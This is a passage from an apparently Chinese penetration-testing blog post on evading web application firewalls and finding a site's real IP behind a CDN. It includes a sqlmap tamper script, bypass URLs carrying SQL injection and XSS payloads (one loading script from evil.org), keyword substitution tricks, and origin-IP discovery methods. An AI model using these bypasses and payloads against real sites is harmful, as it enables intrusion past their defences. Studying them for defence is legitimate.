class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.common <span class=\"keyword\">import</span> singleTimeWarnMessage</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces space character (' ') with plus ('+')</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Notes:</span></span><br><span class=\"line\"><span class=\"string\">        * Is this any useful? The plus get's url-encoded by sqlmap engine</span></span><br><span class=\"line\"><span class=\"string\">          invalidating the query afterwards</span></span><br><span class=\"line\"><span class=\"string\">        * This tamper script works against all databases</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class=\"line\"><span class=\"string\">    'SELECT+id+FROM+users'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        quote, doublequote, firstspace = <span class=\"literal\">False</span>, <span class=\"literal\">False</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(len(payload)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> firstspace:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> payload[i].isspace():</span><br><span class=\"line\">                    firstspace = <span class=\"literal\">True</span></span><br><span class=\"line\">                    retVal += <span class=\"string\">\"-- asdasd%0A%0A\"</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\\''</span>:</span><br><span class=\"line\">                quote = <span class=\"keyword\">not</span> quote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                doublequote = <span class=\"keyword\">not</span> doublequote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">\" \"</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> doublequote <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> quote:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"-- asdasd%0A%0A\"</span></span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            retVal += payload[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure><h3 id=\"分块传输绕过\"><a href=\"#分块传输绕过\" class=\"headerlink\" title=\"分块传输绕过\"></a>分块传输绕过</h3><p>相关原理知识点在安全客上<a href=\"https://www.anquanke.com/post/id/169738，这里仅做记录\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/169738，这里仅做记录</a></p><img src=\"../img/hexo-2019-10-12-16-29-23.png\" width=\"50%\"><h3 id=\"静态文件绕过\"><a href=\"#静态文件绕过\" class=\"headerlink\" title=\"静态文件绕过\"></a>静态文件绕过</h3><p>通过静态文件后缀可发内置的白名单，直接被安全狗放行</p><p>IIS版安全狗<br>///.js? js可以换成rm/wm/png/jpg等静态文件后缀<br>测试发现，只要url包含 ///.js? 就会触发内置的白名单，直接被iis版安全狗放行。<br>对于安全狗iis版，php,aspx,asp均能用这种方式过狗。<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;script&gt;alert(/xss/)&lt;/script&gt;&amp;safe=///.js?</code>(既有sql注入，又有xss攻击，放行)<br><code>http://192.168.29.131:8980/sql.php?id=1%20and%201%3d1&amp;xss=&lt;SCRIPT%20SRC=http://evil.org/xss.js?&lt;/script&gt;</code>(很evil，也放行)</p><p>apache版安全狗<br><code>http://.../sql.php/1.js?id=1</code><br><code>http://.../sql.aspx/1.js?id=1</code></p><img src=\"../img/hexo-2019-10-12-16-31-41.png\" width=\"50%\"><h3 id=\"具体bypass字符串替换\"><a href=\"#具体bypass字符串替换\" class=\"headerlink\" title=\"具体bypass字符串替换\"></a>具体bypass字符串替换</h3><p>可bypass替换表格</p><table><thead><tr><th>拦截字符</th><th>Bypass字符</th></tr></thead><tbody><tr><td>And</td><td>&amp;&amp;(Encode URL)%26%26</td></tr><tr><td>1=1</td><td>true</td></tr><tr><td>1=2</td><td>false</td></tr><tr><td>均可判断页面变化</td><td>Xor False/Xor True</td></tr></tbody></table><hr><p>2019/10/14更新</p><hr><h1 id=\"对抗云WAF\"><a href=\"#对抗云WAF\" class=\"headerlink\" title=\"对抗云WAF\"></a>对抗云WAF</h1><p>云WAF的工作原理是利用DNS技术，通过移交域名解析权来实现安全防护。用户的请求首先发送到云端节点进行检测，如存在异常请求则进行拦截否则将请求转发至真实服务器。类似的，CDN也有相应的功能。比较常遇到的有：创宇加速乐、云盾、百度云加速等。</p><p>因此，我们主要努力的方向是找到服务器的真实IP，从而对云WAF和CDN来进行绕过。</p><h2 id=\"验证是否存在CND\"><a href=\"#验证是否存在CND\" class=\"headerlink\" title=\"验证是否存在CND\"></a>验证是否存在CND</h2><p><strong>方法1：</strong><br>使用多地ping服务，查看解析的IP地址是否为同一个IP地址，如果不唯一很大概率是使用了CDN，也可以查询多个解析的IP地址的归属来进行判断。<br>多地ping的网站有：<br><a href=\"http://ping.chinaz.com/\" target=\"_blank\" rel=\"noopener\">http://ping.chinaz.com/</a><br><a href=\"https://ping.aizhan.com/\" target=\"_blank\" rel=\"noopener\">https://ping.aizhan.com/</a></p><p><strong>方法2:</strong><br>使用nslookup进行检测，原理和上面的方法是一样的，如果返回域名解析对应多个IP地址多半是使用了CDN。有CDN的示例：</p><img src=\"../img/hexo-2019-10-14-11-11-19.png\" width=\"35%\"><h2 id=\"绕过CDN查找真实IP\"><a href=\"#绕过CDN查找真实IP\" class=\"headerlink\" title=\"绕过CDN查找真实IP\"></a>绕过CDN查找真实IP</h2><h3 id=\"查询历史DNS记录\"><a href=\"#查询历史DNS记录\" class=\"headerlink\" title=\"查询历史DNS记录\"></a>查询历史DNS记录</h3><p>查询域名历史DNS解析记录，可能会存在使用CDN以前的记录，相关查询网站有：<br>国内：<br><a href=\"https://site.ip138.com\" target=\"_blank\" rel=\"noopener\">https://site.ip138.com</a> ip138<br><a href=\"https://x.threatbook.cn\" target=\"_blank\" rel=\"noopener\">https://x.threatbook.cn</a> 微步在线<br><a href=\"https://tools.ipip.net/cdn.php\" target=\"_blank\" rel=\"noopener\">https://tools.ipip.net/cdn.php</a> CDN查询<br>国外：<br><a href=\"https://securitytrails.com/\" target=\"_blank\" rel=\"noopener\">https://securitytrails.com/</a><br>这里还会提供子域名等信息</p><img src=\"../img/hexo-2019-10-14-15-15-17.png\" width=\"50%\"> 为避免误差，可以将所有历史IP采集下来挨个与当前域名匹配。 优点：较为简单并且可以通用 缺点：若是目标站点解析变更极少，CDN部署得早等情况下则适用性低<h3 id=\"SMTP发送邮件泄露原站IP\"><a href=\"#SMTP发送邮件泄露原站IP\" class=\"headerlink\" title=\"SMTP发送邮件泄露原站IP\"></a>SMTP发送邮件泄露原站IP</h3><p>最直接最有效的方式。大部分公用SMTP服务在发信时邮件头会带上发件者IP，这样直接导致CDN失去原本的防护意义。<br>这里用某招聘网站作为例子，在忘记密码处，填写自己的邮箱，在收件箱处查看信头<br><img src=\"../img/hexo-2019-10-14-15-55-42.png\" width=\"50%\"><br>箭头处就是发件人IP地址。获取到该地址后可以修改hosts将域名和该IP地址绑定来绕过CDN，或者通过IP:端口的方式来访问。</p><h3 id=\"查询子域名\"><a href=\"#查询子域名\" class=\"headerlink\" title=\"查询子域名\"></a>查询子域名</h3><p>一些情况下，站点管理员只把主业务部署了CDN，而在同一个服务器的子域名却没有部署CDN，通过查询或者爆破子域名，将子域名IP和目标域名相匹配，直到访问成功。</p><p>这里使用的是<a href=\"https://github.com/lijiejie/subDomainsBrute\" target=\"_blank\" rel=\"noopener\">https://github.com/lijiejie/subDomainsBrute</a> 的子域名爆破脚本。</p><h3 id=\"网站漏洞利用\"><a href=\"#网站漏洞利用\" class=\"headerlink\" title=\"网站漏洞利用\"></a>网站漏洞利用</h3><p>1) 当目标站点存在信息泄露，例如：phpinfo页面等等。<br>2) SSRF，通过SSRF，使得服务器主动向接受平台发起连接，从而获得服务器真实IP。</p><p>这些方法获取到的真实IP基本是百分百准确的。</p><h3 id=\"利用国外主机解析域名\"><a href=\"#利用国外主机解析域名\" class=\"headerlink\" title=\"利用国外主机解析域名\"></a>利用国外主机解析域名</h3><p>一些CDN厂商可能只对国内发起的访问做了CDN，而针对国外的线路则没有，因此如果使用国外主机对域名发起解析可能就可以的到服务器的真实IP。</p><p><strong>获取到网站的真实IP后，可直接通过IP:端口的方式进行访问，但有时站点时不允许直接通过IP发起访问的，这时候就需要修改hosts文件，将寻找到的真实IP和域名绑定在一起，此时访问目标域名就会解析到绑定的真实IP上，从而绕过CDN和云WAF的防护。</strong></p><!-- rebuild by neat -->","excerpt":"在渗透测试的过程中，经常会遇到各种各样的WAF，WAF会将用户提交的符合规则库中的恶意数据给阻断，这对渗透测试带来了挑战。要想对抗WAF来继续对目标进行渗透，就必须先了解WAF的类型和原理才能于其规则进行对抗。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"http://ll-mf.github.io/tags/Web/"},{"name":"Bypass","slug":"Bypass","permalink":"http://ll-mf.github.io/tags/Bypass/"}]}]